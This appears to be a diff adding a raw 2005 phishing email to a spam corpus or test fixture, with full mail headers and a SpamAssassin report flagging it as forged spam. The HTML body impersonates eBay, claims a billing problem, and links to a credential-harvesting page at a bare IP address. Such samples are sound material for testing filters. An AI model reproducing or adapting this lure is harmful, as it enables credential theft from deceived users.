@@ -1,0 +1,99 @@
+From nobody Sun Jan 25 14:03:10 2015
+Return-Path: <accounts@ebay.com>
+X-Original-To: username@login.domain.com
+Delivered-To: username@login.domain.com
+Received: from mail1.domain.com (mail1.domain.com [10.0.2.3])
+ by naughty.domain.com (Postfix) with ESMTP id C9016536E13
+ for <username@login.domain.com>; Sun, 30 Oct 2005 04:37:17 -0500 (EST)
+Received: from mail1.domain.com (localhost.domain.com [127.0.0.1])
+ by mail1.domain.com (Postfix) with ESMTP id AF8936CCE3E
+ for <username@domain.com>; Sun, 30 Oct 2005 04:37:16 -0500 (EST)
+Received: from donahue.servermatrix.com (unknown [70.84.4.250])
+ by mail1.domain.com (Postfix) with ESMTP
+ for <username@domain.com>; Sun, 30 Oct 2005 04:37:16 -0500 (EST)
+Received: from [86.105.35.162] (helo=User)
+ by donahue.servermatrix.com with esmtpa (Exim 4.43)
+ id 1EW8ms-0003Eu-88; Sun, 30 Oct 2005 03:43:34 -0500
+Reply-To: <norply@ebay.com>
+From: "eBay" <accounts@ebay.com>
+Subject: eBay Inc: Important Notification
+Date: Sun, 30 Oct 2005 10:43:34 +0200
+MIME-Version: 1.0
+Content-Type: text/html;
+	charset="Windows-1251"
+Content-Transfer-Encoding: 7bit
+X-Priority: 1
+X-MSMail-Priority: High
+X-Mailer: Microsoft Outlook Express 6.00.2600.0000
+X-MimeOLE: Produced By Microsoft MimeOLE V6.00.2600.0000
+X-AntiAbuse: This header was added to track abuse,
+ please include it with any abuse report
+X-AntiAbuse: Primary Hostname - donahue.servermatrix.com
+X-AntiAbuse: Original Domain - domain.com
+X-AntiAbuse: Originator/Caller UID/GID - [47 12] / [47 12]
+X-AntiAbuse: Sender Address Domain - ebay.com
+X-Source: 
+X-Source-Args: 
+X-Source-Dir: 
+X-Spam-Flag: YES
+X-Spam-Checker-Version: SpamAssassin 3.0.2 (2004-11-16)
+X-Spam-Level: *********
+X-Spam-Status: Yes, score=9.7 required=5.0 tests=AWL,FORGED_MUA_OUTLOOK,
+ FORGED_OUTLOOK_HTML,FORGED_OUTLOOK_TAGS,HTML_EVENT_UNSAFE,
+ HTML_MESSAGE,HTML_MIME_NO_HTML_TAG,HTML_TEXT_AFTER_BODY,
+ HTTP_ESCAPED_HOST,IP_LINK_PLUS,MIME_HTML_ONLY,MISSING_HEADERS,
+ NORMAL_HTTP_TO_IP,NO_REAL_NAME,RAZOR2_CF_RANGE_51_100,RAZOR2_CHECK,
+ RCVD_IN_BL_SPAMCOP_NET autolearn=no version=3.0.2
+X-Spam-Report: *  0.0 NO_REAL_NAME From: does not include a real name
+ *  0.1 MISSING_HEADERS Missing To: header
+ *  0.0 NORMAL_HTTP_TO_IP URI: Uses a dotted-decimal IP address in URL
+ *  0.5 HTTP_ESCAPED_HOST URI: Uses %-escapes inside a URL's hostname
+ *  0.2 IP_LINK_PLUS URI: Dotted-decimal IP address followed by CGI
+ *  0.1 HTML_TEXT_AFTER_BODY BODY: HTML contains text after BODY close tag
+ *  0.0 HTML_MESSAGE BODY: HTML included in message
+ *  0.1 RAZOR2_CF_RANGE_51_100 BODY: Razor2 gives confidence level above 50%
+ *      [cf: 100]
+ *  0.2 MIME_HTML_ONLY BODY: Message only has text/html MIME parts
+ *  0.5 HTML_EVENT_UNSAFE BODY: HTML contains unsafe auto-executing code
+ *  1.5 RAZOR2_CHECK Listed in Razor2 (http://razor.sf.net/)
+ *  1.2 RCVD_IN_BL_SPAMCOP_NET RBL: Received via a relay in bl.spamcop.net
+ *      [Blocked - see <http://www.spamcop.net/bl.shtml?70.84.4.250>]
+ *  0.6 FORGED_OUTLOOK_HTML Outlook can't send HTML message only
+ *  0.1 HTML_MIME_NO_HTML_TAG HTML-only message, but there is no HTML tag
+ *  0.1 FORGED_OUTLOOK_TAGS Outlook can't send HTML in this format
+ *  3.9 FORGED_MUA_OUTLOOK Forged mail pretending to be from MS Outlook
+ *  0.5 AWL AWL: From: address is in the auto white-list
+Message-Id: <20051030093716.AF8936CCE3E@mail1.domain.com>
+To: undisclosed-recipients: ;
+X-Keywords: 
+Status: O
+Content-Length: 3790
+Lines: 27
+
+
+
+<BODY oncontextmenu="return false" dir=ltr style="OVERFLOW-Y: scroll" leftMargin=0 topMargin=0 rightMargin=0><DIV id=wrteplaceholder style="FONT-FAMILY: Arial" name="wrteplaceholder">
+<DIV>
+<P><FONT face="Arial, Helvetica, sans-serif" size=2>Dear eBay Member, </FONT></P>
+<P><FONT face="Arial, Helvetica, sans-serif" size=2>We at eBay are sorry to inform you that we are having problems with<BR>the billing information of your account. We would<BR>appreciate it if you<BR>would visit our website </FONT><A href="http://203.172.247.19/.cgi-bin/.eBay/"><FONT face="Arial, Helvetica, sans-serif" size=2>eBay Account Activation</FONT></A><FONT face="Arial, Helvetica, sans-serif" size=2> and fill out<BR>the proper<BR>information that we are needing to keep you as an eBay member.</FONT></P>
+<P><FONT face="Arial, Helvetica, sans-serif" size=2>If you think you have received this email as an error, please visit<BR>our website and fill out the necessary information. That way we can<BR>make sure that everything is up to date! Again here is the<BR>link to our website. </FONT><A href="http://203.172.247.19/.cgi-bin/.eBay/"><FONT face="Arial, Helvetica, sans-serif" size=2>eBay Account Activation Form</FONT></A></P>
+<P><FONT face="Arial, Helvetica, sans-serif" size=2>*******<BR>Please Do Not Reply To This E-Mail As You Will Not Receive A Response<BR>*******</FONT><FONT face="Verdana, Helvetica, Arial, sans-serif" size=3> </FONT></P>
+<P><FONT face="Arial, Helvetica, sans-serif" size=2>Thank you<BR>Accounts Management</FONT></P>
+<P><FONT face="Arial, Helvetica, sans-serif" size=2>As outlined in our User Agreement, eBay will periodically send you<BR>information about site changes and enhancements. Visit our Privacy<BR>Policy and User Agreement if you have any questions.</FONT></P>
+
+<HR width=400 color=#000000 SIZE=1>
+
+<P align=center><A href="http://www.eBay.com"><FONT face="Arial, Verdana, Helvetica, sans-serif" size=2>
+Announcements</FONT></A><FONT face="Arial, Verdana, Helvetica, sans-serif" size=2> 
+| </FONT><A href="http://www.eBay.com/"><FONT face="Arial, Verdana, Helvetica, sans-serif" size=2>
+Register</FONT></A><FONT face="Arial, Verdana, Helvetica, sans-serif" size=2> | </FONT><A href="http://www.eBay.com"><FONT face="Arial, Verdana, Helvetica, sans-serif" size=2>
+Safe Trading Tips</FONT></A><FONT face="Arial, Verdana, Helvetica, sans-serif" size=2> 
+| </FONT><A href="http://www.eBay.com"><FONT face="Arial, Verdana, Helvetica, sans-serif" size=2>
+Policies</FONT></A><FONT face="Arial, Verdana, Helvetica, sans-serif" size=2> | </FONT><A href="http://www.eBay.com"><FONT face="Arial, Verdana, Helvetica, sans-serif" size=2>
+Feedback Forum</FONT></A><FONT face="Arial, Verdana, Helvetica, sans-serif" size=2> 
+| </FONT>
+<A href="http://www.zyra.org!%20.uk/ebay.htm"><FONT face="Arial, Verdana, Helvetica, sans-serif" size=2>
+About eBay</FONT></A></P>
+<P><A href="http://www.eBay.com"><IMG height=31 alt=TrustE hspace=0 src="http://www.zyra.org/truste.gif" width=116 align=right border=0></A><FONT face="Arial, Verdana, Helvetica, sans-serif" size=1>Copyright ?1995-2005 eBay Inc. All Rights Reserved.<BR>Designated trademarks and brands are the property of their respective owners.<BR>Use of this Web site constitutes acceptance of the eBay </FONT><A href="http://www.eBay.com"><FONT face="Arial, Verdana, Helvetica, sans-serif" size=1>User Agreement</FONT></A><FONT face="Arial, Verdana, Helvetica, sans-serif" size=1> and </FONT><A href="http://www.eBay.com"><FONT face="Arial, Verdana, Helvetica, sans-serif" size=1>Privacy Policy</FONT></A></P></DIV></DIV></BODY><hr><div style="background-color:white;color:black;">Walla! Mail - <a href="http://www.walla.com" style="color:blue">get your free 3G mail today</a></div>
+ 
+SDQWHUDJEURKZXZQKDHYIXSHFLLUJKJRHTTSCF
